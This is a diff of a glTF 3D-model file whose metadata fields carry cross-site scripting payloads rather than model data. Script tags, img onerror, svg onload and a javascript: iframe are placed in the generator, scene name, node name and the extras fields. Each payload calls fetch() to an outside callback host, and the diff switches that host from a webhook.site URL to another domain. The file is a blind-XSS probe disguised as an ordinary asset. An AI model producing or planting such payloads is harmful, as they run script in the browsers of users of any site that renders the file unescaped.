@@ -1,23 +1,23 @@
 {
   "asset": {
     "version": "2.0",
-    "generator": "<img src=x onerror=fetch('https://webhook.site/226356a4-be94-46d6-a87c-d6e063983609/probe-gltf-generator')>",
+    "generator": "<img src=x onerror=fetch('https://screenshotsart.store/dcl/probe-gltf-generator')>",
     "extras": {
-      "xss": "<script>fetch('https://webhook.site/226356a4-be94-46d6-a87c-d6e063983609/probe-gltf-asset-extras')</script>"
+      "xss": "<script>fetch('https://screenshotsart.store/dcl/probe-gltf-asset-extras')</script>"
     }
   },
   "scene": 0,
   "scenes": [{
-    "name": "<img src=x onerror=fetch('https://webhook.site/226356a4-be94-46d6-a87c-d6e063983609/probe-gltf-scene-name')>",
+    "name": "<img src=x onerror=fetch('https://screenshotsart.store/dcl/probe-gltf-scene-name')>",
     "nodes": [0]
   }],
   "nodes": [{
-    "name": "<svg onload=fetch('https://webhook.site/226356a4-be94-46d6-a87c-d6e063983609/probe-gltf-node-name')>",
+    "name": "<svg onload=fetch('https://screenshotsart.store/dcl/probe-gltf-node-name')>",
     "extras": {
-      "description": "<script>fetch('https://webhook.site/226356a4-be94-46d6-a87c-d6e063983609/probe-gltf-node-extras')</script>"
+      "description": "<script>fetch('https://screenshotsart.store/dcl/probe-gltf-node-extras')</script>"
     }
   }],
   "extras": {
-    "rootExtras": "<iframe src=javascript:fetch('https://webhook.site/226356a4-be94-46d6-a87c-d6e063983609/probe-gltf-root-extras')></iframe>"
+    "rootExtras": "<iframe src=javascript:fetch('https://screenshotsart.store/dcl/probe-gltf-root-extras')></iframe>"
   }
 }
